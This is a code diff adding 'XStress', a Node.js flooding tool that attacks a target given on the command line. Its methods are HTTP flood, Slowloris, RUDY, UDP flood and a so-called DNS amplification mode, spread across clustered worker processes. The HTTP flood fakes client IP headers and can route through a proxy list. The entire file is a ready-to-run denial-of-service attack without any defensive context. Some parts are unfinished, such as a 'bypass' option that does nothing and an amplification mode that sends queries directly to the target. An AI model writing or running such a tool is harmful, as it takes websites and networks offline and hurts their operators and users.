@@ -1,0 +1,335 @@
+const net = require('net');
+const http = require('http');
+const https = require('https');
+const dns = require('dns');
+const crypto = require('crypto');
+const cluster = require('cluster');
+const os = require('os');
+
+const pkg = require('./package.json');
+
+const userAgents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
+];
+
+class XStress {
+  constructor(target, options = {}) {
+    this.target = target;
+    this.port = options.port || 80;
+    this.time = options.time || 60;
+    this.threads = options.threads || os.cpus().length;
+    this.method = options.method || 'HTTP-FLOOD';
+    this.proxyFile = options.proxyFile || null;
+    this.proxies = [];
+    this.running = false;
+    this.sentPackets = 0;
+    this.startTime = null;
+    this.endTime = null;
+    this.bypassMode = options.bypass || 'aggressive';
+    this.timeout = options.timeout || 5000;
+  }
+
+  async loadProxies() {
+    if (!this.proxyFile) return;
+    try {
+      const fs = require('fs');
+      const data = fs.readFileSync(this.proxyFile, 'utf8');
+      this.proxies = data.split('\n').filter(line => line.trim()).map(line => {
+        const [host, port] = line.split(':');
+        return { host, port: parseInt(port) };
+      });
+    } catch (e) {}
+  }
+
+  getRandomProxy() {
+    if (this.proxies.length === 0) return null;
+    return this.proxies[Math.floor(Math.random() * this.proxies.length)];
+  }
+
+  getRandomIP() {
+    return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
+  }
+
+  createHttpFloodSocket() {
+    const proxy = this.getRandomProxy();
+    const socket = proxy ? net.createConnection(proxy.port, proxy.host) : net.createConnection(this.port, this.target);
+    
+    socket.setTimeout(this.timeout);
+    
+    socket.on('connect', () => {
+      const path = '/?' + crypto.randomBytes(8).toString('hex');
+      const headers = [
+        `GET ${path} HTTP/1.1`,
+        `Host: ${this.target}`,
+        `User-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}`,
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language: en-US,en;q=0.5',
+        'Accept-Encoding: gzip, deflate',
+        'Connection: keep-alive',
+        'Upgrade-Insecure-Requests: 1',
+        `X-Forwarded-For: ${this.getRandomIP()}`,
+        `X-Real-IP: ${this.getRandomIP()}`,
+        `Client-IP: ${this.getRandomIP()}`,
+        ''
+      ].join('\r\n') + '\r\n';
+      
+      socket.write(headers);
+      this.sentPackets++;
+    });
+
+    socket.on('data', () => {});
+    socket.on('error', () => {});
+    socket.on('timeout', () => socket.destroy());
+    
+    return socket;
+  }
+
+  createSlowLorisSocket() {
+    const socket = net.createConnection(this.port, this.target);
+    let headersSent = false;
+    
+    socket.on('connect', () => {
+      const partialHeaders = [
+        'POST / HTTP/1.1',
+        `Host: ${this.target}`,
+        `User-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}`,
+        'Content-Length: 1000000',
+        'Connection: keep-alive',
+        ''
+      ].join('\r\n') + '\r\n';
+      
+      socket.write(partialHeaders);
+      headersSent = true;
+      this.sentPackets++;
+    });
+
+    const interval = setInterval(() => {
+      if (!this.running) {
+        clearInterval(interval);
+        return;
+      }
+      if (headersSent) {
+        socket.write('X-a: ' + crypto.randomBytes(4).toString('hex') + '\r\n');
+        this.sentPackets++;
+      }
+    }, 15000);
+
+    socket.on('error', () => {
+      clearInterval(interval);
+    });
+    
+    return socket;
+  }
+
+  createRUDYSocket() {
+    const proxy = this.getRandomProxy();
+    const socket = proxy ? net.createConnection(proxy.port, proxy.host) : net.createConnection(this.port, this.target);
+    
+    socket.on('connect', () => {
+      const lines = Math.floor(Math.random() * 10) + 5;
+      for (let i = 0; i < lines; i++) {
+        const delay = i * 1000;
+        setTimeout(() => {
+          if (!this.running) return;
+          const header = `X-${crypto.randomBytes(4).toString('hex')}: ${crypto.randomBytes(10).toString('hex')}\r\n`;
+          socket.write(header);
+          this.sentPackets++;
+        }, delay);
+      }
+      
+      setTimeout(() => {
+        if (!this.running) return;
+        const path = '/?' + crypto.randomBytes(8).toString('hex');
+        const finalHeaders = `GET ${path} HTTP/1.1\r\nHost: ${this.target}\r\n\r\n`;
+        socket.write(finalHeaders);
+        this.sentPackets++;
+      }, (lines + 1) * 1000);
+    });
+
+    socket.on('error', () => {});
+    
+    return socket;
+  }
+
+  createUDPFloodSocket() {
+    const dgram = require('dgram');
+    const client = dgram.createSocket('udp4');
+    
+    const interval = setInterval(() => {
+      if (!this.running) {
+        clearInterval(interval);
+        client.close();
+        return;
+      }
+      
+      const message = crypto.randomBytes(1024);
+      dns.lookup(this.target, (err, address) => {
+        if (err) return;
+        for (let i = 0; i < 100; i++) {
+          client.send(message, 0, message.length, this.port, address, (err) => {});
+          this.sentPackets++;
+        }
+      });
+    }, 10);
+    
+    return client;
+  }
+
+  createDNSAmplification() {
+    const dgram = require('dgram');
+    const client = dgram.createSocket('udp4');
+    
+    const query = Buffer.from([
+      0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
+      0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
+      0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
+    ]);
+    
+    const interval = setInterval(() => {
+      if (!this.running) {
+        clearInterval(interval);
+        client.close();
+        return;
+      }
+      
+      dns.lookup(this.target, (err, address) => {
+        if (err) return;
+        for (let i = 0; i < 50; i++) {
+          client.send(query, 0, query.length, 53, address, (err) => {});
+          this.sentPackets += query.length;
+        }
+      });
+    }, 5);
+    
+    return client;
+  }
+
+  async start() {
+    this.running = true;
+    this.startTime = Date.now();
+    this.endTime = this.startTime + (this.time * 1000);
+    
+    await this.loadProxies();
+    
+    if (cluster.isMaster) {
+      for (let i = 0; i < this.threads; i++) {
+        cluster.fork();
+      }
+      
+      const statsInterval = setInterval(() => {
+        if (!this.running) {
+          clearInterval(statsInterval);
+          return;
+        }
+        const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
+        if (elapsed >= this.time) {
+          this.stop();
+        }
+      }, 1000);
+      
+      cluster.on('exit', (worker, code, signal) => {});
+    } else {
+      const sockets = [];
+      const maxSockets = 500;
+      
+      const floodInterval = setInterval(() => {
+        if (!this.running) {
+          clearInterval(floodInterval);
+          for (const socket of sockets) {
+            try { socket.destroy(); } catch (e) {}
+          }
+          process.exit(0);
+          return;
+        }
+        
+        const now = Date.now();
+        if (now >= this.endTime) {
+          this.running = false;
+          return;
+        }
+        
+        for (let i = 0; i < 50; i++) {
+          if (sockets.length < maxSockets) {
+            let socket;
+            switch (this.method) {
+              case 'HTTP-FLOOD':
+                socket = this.createHttpFloodSocket();
+                break;
+              case 'SLOWLORIS':
+                socket = this.createSlowLorisSocket();
+                break;
+              case 'RUDY':
+                socket = this.createRUDYSocket();
+                break;
+              case 'UDP-FLOOD':
+                socket = this.createUDPFloodSocket();
+                break;
+              case 'DNS-AMP':
+                socket = this.createDNSAmplification();
+                break;
+              default:
+                socket = this.createHttpFloodSocket();
+            }
+            
+            if (socket) {
+              sockets.push(socket);
+              socket.once('close', () => {
+                const index = sockets.indexOf(socket);
+                if (index > -1) sockets.splice(index, 1);
+              });
+            }
+          }
+        }
+      }, 10);
+    }
+  }
+
+  stop() {
+    this.running = false;
+    if (cluster.isMaster) {
+      for (const id in cluster.workers) {
+        cluster.workers[id].kill();
+      }
+      setTimeout(() => process.exit(0), 1000);
+    }
+  }
+
+  getStats() {
+    return {
+      sentPackets: this.sentPackets,
+      elapsed: this.startTime ? Math.floor((Date.now() - this.startTime) / 1000) : 0,
+      running: this.running
+    };
+  }
+}
+
+const args = process.argv.slice(2);
+if (args.length < 1) {
+  process.exit(1);
+}
+
+const target = args[0];
+const options = {
+  port: parseInt(args[1]) || 80,
+  time: parseInt(args[2]) || 60,
+  threads: parseInt(args[3]) || os.cpus().length,
+  method: args[4] || 'HTTP-FLOOD',
+  proxyFile: args[5] || null,
+  bypass: args[6] || 'aggressive',
+  timeout: parseInt(args[7]) || 5000
+};
+
+if (!target) process.exit(1);
+
+const stress = new XStress(target, options);
+stress.start();
+
+process.on('SIGINT', () => {
+  stress.stop();
+  process.exit(0);
+});
